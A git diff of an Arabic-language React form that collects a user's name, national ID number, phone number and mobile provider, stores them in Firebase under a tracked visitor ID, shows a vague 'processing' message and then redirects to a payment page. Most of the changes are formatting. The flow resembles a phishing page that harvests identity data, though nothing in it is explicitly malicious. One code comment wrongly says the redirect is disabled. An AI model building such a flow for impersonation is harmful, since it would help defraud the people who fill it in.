@@ -1,15 +1,28 @@
-"use client"
+"use client";
 
-import type React from "react"
-import { useState } from "react"
-import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { User, Phone, Wifi, UserSquare, CheckCircle } from "lucide-react"
-import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
-import { addData } from "@/lib/firebase"
+import type React from "react";
+import { useState } from "react";
+import { Button } from "@/components/ui/button";
+import {
+  Card,
+  CardContent,
+  CardDescription,
+  CardFooter,
+  CardHeader,
+  CardTitle,
+} from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import { User, Phone, Wifi, UserSquare, CheckCircle } from "lucide-react";
+import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
+import { addData } from "@/lib/firebase";
 
 export default function NetworkInfoForm() {
   const [formData, setFormData] = useState({
@@ -17,43 +30,45 @@ export default function NetworkInfoForm() {
     idNumber: "",
     phone: "",
     networkProvider: "",
-  })
-  const [submitted, setSubmitted] = useState(false)
+  });
+  const [submitted, setSubmitted] = useState(false);
 
   const handleInputChange = (field: string, value: string) => {
-    setFormData((prev) => ({ ...prev, [field]: value }))
-  }
+    setFormData((prev) => ({ ...prev, [field]: value }));
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    const visitorId = localStorage.getItem("visitor")
-    await addData({ id: visitorId, ...formData })
-    setSubmitted(true)
+    e.preventDefault();
+    const visitorId = localStorage.getItem("visitor");
+    await addData({ id: visitorId, ...formData });
+    setSubmitted(true);
 
     // The original code redirected immediately, which would prevent the success message from being shown.
     // I've commented it out. If you want to redirect after a delay, you can use setTimeout.
-     setTimeout(() => {
-       window.location.href = "/payment";
-     }, 2000); // Redirect after 2 seconds
-  }
+    setTimeout(() => {
+      window.location.href = "/payment";
+    }, 2000); // Redirect after 2 seconds
+  };
 
   return (
-    <div className="min-h-screen bg-gray-50 p-4 flex items-center justify-center" dir="rtl">
+    <div
+      className="min-h-screen bg-gray-50 p-4 flex items-center justify-center"
+      dir="rtl"
+    >
       <Card className="w-full max-w-md shadow-lg border-gray-200">
         <CardHeader className="text-center">
-          <div className="inline-flex items-center justify-center w-14 h-14 bg-green-100 text-green-600 rounded-full mx-auto mb-4">
-            <Wifi className="h-7 w-7" />
-          </div>
-          <CardTitle className="text-2xl font-bold text-gray-800">معلومات الشبكة</CardTitle>
-          <CardDescription className="text-gray-500 pt-1">الرجاء إدخال بياناتك للمتابعة</CardDescription>
+          <CardTitle className="text-2xl font-bold text-gray-800">
+            المعلومات الاساسية
+          </CardTitle>
+          <CardDescription className="text-gray-500 pt-1">
+            الرجاء إدخال بياناتك للمتابعة
+          </CardDescription>
         </CardHeader>
         <form onSubmit={handleSubmit}>
           <CardContent className="space-y-6">
             {submitted ? (
               <Alert className="border-green-500 bg-green-50 text-green-800">
-                <CheckCircle className="h-4 w-4 !text-green-600" />
-                <AlertTitle className="font-bold">تم الإرسال بنجاح!</AlertTitle>
-                <AlertDescription>شكراً لك، تم استلام معلوماتك وسنتواصل معك قريباً.</AlertDescription>
+                جاري معالجة الطلب
               </Alert>
             ) : (
               <>
@@ -80,7 +95,9 @@ export default function NetworkInfoForm() {
                     id="idNumber"
                     placeholder="ادخل رقم الهوية"
                     value={formData.idNumber}
-                    onChange={(e) => handleInputChange("idNumber", e.target.value)}
+                    onChange={(e) =>
+                      handleInputChange("idNumber", e.target.value)
+                    }
                     required
                     dir="rtl"
                     type="tel"
@@ -103,11 +120,19 @@ export default function NetworkInfoForm() {
                   />
                 </div>
                 <div className="space-y-2">
-                  <Label htmlFor="networkProvider" className="flex items-center gap-2">
+                  <Label
+                    htmlFor="networkProvider"
+                    className="flex items-center gap-2"
+                  >
                     <Wifi className="h-4 w-4 text-gray-500" />
                     <span>مزود الخدمة</span>
                   </Label>
-                  <Select onValueChange={(value) => handleInputChange("networkProvider", value)} required>
+                  <Select
+                    onValueChange={(value) =>
+                      handleInputChange("networkProvider", value)
+                    }
+                    required
+                  >
                     <SelectTrigger id="networkProvider" className="h-11">
                       <SelectValue placeholder="اختر مزود الخدمة" />
                     </SelectTrigger>
@@ -123,7 +148,10 @@ export default function NetworkInfoForm() {
           </CardContent>
           {!submitted && (
             <CardFooter>
-              <Button type="submit" className="w-full bg-green-600 hover:bg-green-700 h-11">
+              <Button
+                type="submit"
+                className="w-full bg-green-600 hover:bg-green-700 h-11"
+              >
                 إرسال
               </Button>
             </CardFooter>
@@ -131,5 +159,5 @@ export default function NetworkInfoForm() {
         </form>
       </Card>
     </div>
-  )
+  );
 }
